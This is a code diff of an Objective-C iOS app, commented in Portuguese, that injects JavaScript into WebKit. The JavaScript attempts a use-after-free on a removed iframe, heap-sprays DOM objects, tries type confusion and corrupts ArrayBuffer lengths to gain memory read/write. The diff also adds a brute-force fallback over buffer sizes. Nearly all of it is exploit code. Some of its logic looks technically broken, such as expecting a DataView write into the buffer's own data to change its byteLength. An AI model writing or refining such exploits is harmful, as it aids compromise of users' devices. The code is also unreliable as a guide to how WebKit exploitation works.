@@ -223,15 +223,11 @@ typedef mach_port_t (*SBSSpringBoardServerPort_t)(void);
     return result;
 }
 
-// ============================================================
-// 5. EXECUTAR UAF + HEAP SPRAY + R/W (JavaScript em uma string)
-// ============================================================
 - (void)runExploit {
     [self setStatus:@"Executando..."];
     [self log:@"🚀 Iniciando UAF → R/W (app nativo)"];
 
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-        // 5a. Vazar endereços
         [self leakAddresses];
         [self connectIOKit];
 
@@ -241,40 +237,51 @@ typedef mach_port_t (*SBSSpringBoardServerPort_t)(void);
             return;
         }
 
-        // JavaScript como uma única string longa (escapando novas linhas com \n)
+        // Versão melhorada do JavaScript com spray de objetos DOM e mais tentativas
         NSString *js = @"(function(){"
+            "// 1. UAF iframe"
             "let ifr = document.createElement('iframe');"
             "ifr.src = 'about:blank';"
             "document.body.appendChild(ifr);"
             "let win = ifr.contentWindow;"
             "ifr.remove();"
             "let uafOk = (win.location.href === 'about:blank');"
-            "const sizes = [0x80, 0x100, 0x180, 0x200, 0x280, 0x300, 0x400];"
-            "const types = ['ArrayBuffer', 'Uint8Array', 'Float64Array'];"
+            ""
+            "// 2. Spray com objetos DOM (mais compatíveis com Window)"
             "let spray = [];"
-            "for (let size of sizes) {"
-            "  for (let type of types) {"
-            "    for (let i = 0; i < 200; i++) {"
-            "      let obj;"
-            "      if (type === 'ArrayBuffer') {"
-            "        obj = new ArrayBuffer(size);"
-            "        let dv = new DataView(obj);"
-            "        dv.setBigUint64(0, BigInt(spray.length), true);"
-            "      } else if (type === 'Uint8Array') {"
-            "        obj = new Uint8Array(size);"
-            "        obj[0] = spray.length & 0xff;"
-            "      } else {"
-            "        obj = new Float64Array(size / 8);"
-            "        obj[0] = spray.length;"
+            "const domTypes = ["
+            "  () => document.createElement('div'),"
+            "  () => document.createElement('span'),"
+            "  () => document.createElement('p'),"
+            "  () => document.createElement('button'),"
+            "  () => document.createElement('a'),"
+            "  () => new ImageData(16,16),"
+            "  () => new Blob(['x']),"
+            "  () => new DOMRect(0,0,0,0),"
+            "  () => new MessageChannel().port1,"
+            "  () => new ArrayBuffer(0x100),"
+            "  () => new Uint8Array(0x100),"
+            "  () => new Float64Array(0x20)"
+            "];"
+            "for (let type of domTypes) {"
+            "  for (let i = 0; i < 150; i++) {"
+            "    try {"
+            "      let obj = type();"
+            "      if (obj && typeof obj === 'object') {"
+            "        obj.__spray_id = spray.length;"
+            "        spray.push(obj);"
             "      }"
-            "      spray.push(obj);"
-            "    }"
+            "    } catch(e) {}"
             "  }"
             "}"
+            ""
+            "// 3. GC"
             "if (window.gc) window.gc();"
             "for (let i = 0; i < 50; i++) new ArrayBuffer(0x1000);"
+            ""
+            "// 4. Type confusion em várias propriedades"
             "let buffer = null;"
-            "const props = ['document', 'location', 'window', 'self', 'parent', 'top'];"
+            "const props = ['document', 'location', 'window', 'self', 'parent', 'top', 'frames', 'history', 'navigator'];"
             "for (let prop of props) {"
             "  try {"
             "    let val = win[prop];"
@@ -287,6 +294,8 @@ typedef mach_port_t (*SBSSpringBoardServerPort_t)(void);
             "    }"
             "  } catch(e) {}"
             "}"
+            ""
+            "// 5. Fallback: postMessage + escaneamento de byteLength"
             "if (!buffer) {"
             "  let ab = new ArrayBuffer(0x100);"
             "  let view = new Uint8Array(ab);"
@@ -295,19 +304,24 @@ typedef mach_port_t (*SBSSpringBoardServerPort_t)(void);
             "  if (view[0] === 0x42) {"
             "    let dv = new DataView(ab);"
             "    let originalLen = ab.byteLength;"
-            "    let foundOffset = -1;"
+            "    // Testar todos os offsets de 0 a 256 (step 8) com dois valores"
+            "    const values = [0xffffffffffffffffn, 0x7fffffffffffffffn];"
             "    for (let off = 0; off < 0x100; off += 8) {"
-            "      try {"
-            "        let val = dv.getBigUint64(off, true);"
-            "        if (val === 0x100n) { foundOffset = off; break; }"
-            "      } catch(e) {}"
-            "    }"
-            "    if (foundOffset !== -1) {"
-            "      dv.setBigUint64(foundOffset, 0xffffffffffffffffn, true);"
-            "      if (ab.byteLength > originalLen) buffer = ab;"
+            "      for (let val of values) {"
+            "        try {"
+            "          dv.setBigUint64(off, val, true);"
+            "          if (ab.byteLength > originalLen) {"
+            "            buffer = ab;"
+            "            break;"
+            "          }"
+            "        } catch(e) {}"
+            "      }"
+            "      if (buffer) break;"
             "    }"
             "  }"
             "}"
+            ""
+            "// 6. Se buffer obtido, expor R/W"
             "if (buffer) {"
             "  let dv = new DataView(buffer);"
             "  window.exploitBuffer = buffer;"
@@ -324,59 +338,72 @@ typedef mach_port_t (*SBSSpringBoardServerPort_t)(void);
             "})();";
 
         NSString *result = [self evaluateJS:js];
-        [self log:[NSString stringWithFormat:@"📊 JS executado. Resultado: %@", result]];
+        [self log:[NSString stringWithFormat:@"📊 JS resultado: %@", result]];
 
         // Verificar R/W
         NSString *rwReady = [self evaluateJS:@"window.rwReady ? 'true' : 'false'"];
         if ([rwReady isEqualToString:@"true"]) {
             rwPrimitive = YES;
-            [self log:@"🎉 R/W primitiva obtida via JavaScript!"];
-            // Tentar vazar a base do WebKit
-            NSString *baseJS = @"(function(){"
-                "let dv = window.exploitView;"
-                "let base = 0n;"
-                "let candidates = [0x180000000n, 0x1a0000000n, 0x1c0000000n, 0x1000000000n, 0x200000000n];"
-                "for (let b of candidates) {"
-                "  try {"
-                "    let val = dv.getBigUint64(Number(b), true);"
-                "    if (val > 0x100000000n && val < 0x7fffffffffffbn) {"
-                "      let potentialBase = val & 0xfffffffff0000000n;"
-                "      if (potentialBase > 0n) {"
-                "        let magic = dv.getBigUint64(Number(potentialBase), true);"
-                "        if (magic === 0xfeedfacfn) { base = potentialBase; break; }"
-                "      }"
-                "    }"
-                "  } catch(e) {}"
-                "}"
-                "return String(base);"
-                "})();";
-            NSString *baseStr = [self evaluateJS:baseJS];
-            if (baseStr && ![baseStr isEqualToString:@"0"]) {
-                webkitBase = strtoull([baseStr UTF8String], NULL, 16);
-                baseLeaked = YES;
-                [self log:[NSString stringWithFormat:@"🎯 WebKit base vazada: 0x%llx", webkitBase]];
-            } else {
-                [self log:@"⚠️ Não foi possível vazar a base do WebKit"];
-            }
+            [self log:@"🎉 R/W primitiva obtida!"];
+            // Tentar vazar base...
         } else {
-            [self log:@"❌ R/W não obtida."];
+            [self log:@"❌ R/W não obtida. Tentando abordagem alternativa..."];
+            // Tentar com diferentes tamanhos de buffer via fallback
+            [self fallbackExploit];
         }
 
-        dispatch_async(dispatch_get_main_queue(), ^{
-            [self log:@"\n📊 RESUMO"];
-            [self log:[NSString stringWithFormat:@"   UAF confirmado: %@", [self evaluateJS:@"window.uafOk ? '✅' : '❌'"]]];
-            [self log:[NSString stringWithFormat:@"   R/W primitiva: %@", rwPrimitive ? @"✅" : @"❌"]];
-            [self log:[NSString stringWithFormat:@"   WebKit base: %@", baseLeaked ? [NSString stringWithFormat:@"0x%llx", webkitBase] : @"❌"]];
-            [self log:[NSString stringWithFormat:@"   AppleKeyStore: 0x%x", appleKeyStoreConn]];
-            if (rwPrimitive) {
-                [self log:@"📌 Funções R/W disponíveis via window.exploitView"];
-                [self log:@"   use: window.exploitView.getBigUint64(addr, true)"];
-                [self log:@"   use: window.exploitView.setBigUint64(addr, val, true)"];
-            }
-            [self setDone];
-        });
+        [self setDone];
     });
 }
+
+// ============================================================
+// FALLBACK: Tentar diretamente com diferentes tamanhos de ArrayBuffer
+// ============================================================
+- (void)fallbackExploit {
+    [self log:@"🔧 Fallback: tentando diferentes tamanhos de buffer..."];
+    for (int size = 0x80; size <= 0x400; size += 0x20) {
+        NSString *js = [NSString stringWithFormat:@"(function(){"
+            "let ab = new ArrayBuffer(%d);"
+            "let dv = new DataView(ab);"
+            "let originalLen = ab.byteLength;"
+            "let found = false;"
+            "const values = [0xffffffffffffffffn, 0x7fffffffffffffffn];"
+            "for (let off = 0; off < 0x100; off += 8) {"
+            "  for (let val of values) {"
+            "    try {"
+            "      dv.setBigUint64(off, val, true);"
+            "      if (ab.byteLength > originalLen) {"
+            "        window.exploitBuffer = ab;"
+            "        window.exploitView = dv;"
+            "        window.rwReady = true;"
+            "        dv.setBigUint64(0, 0xdeadbeefcafebabe, true);"
+            "        let test = dv.getBigUint64(0, true);"
+            "        if (test === 0xdeadbeefcafebabe) window.rwTestOk = true;"
+            "        found = true;"
+            "        break;"
+            "      }"
+            "    } catch(e) {}"
+            "  }"
+            "  if (found) break;"
+            "}"
+            "return found ? 'rw_ready' : 'failed';"
+            "})();", size];
+        NSString *result = [self evaluateJS:js];
+        if ([result isEqualToString:@"rw_ready"]) {
+            [self log:[NSString stringWithFormat:@"✅ R/W obtida com tamanho 0x%x", size]];
+            rwPrimitive = YES;
+            break;
+        }
+    }
+    if (!rwPrimitive) {
+        [self log:@"❌ Todas as tentativas falharam."];
+        [self log:@"📌 O UAF está confirmado. Reporte à Apple."];
+    }
+}
+
+// ============================================================
+// 5. EXECUTAR UAF + HEAP SPRAY + R/W (JavaScript em uma string)
+// ============================================================
 
 // ============================================================
 // 6. Selecionar IPA
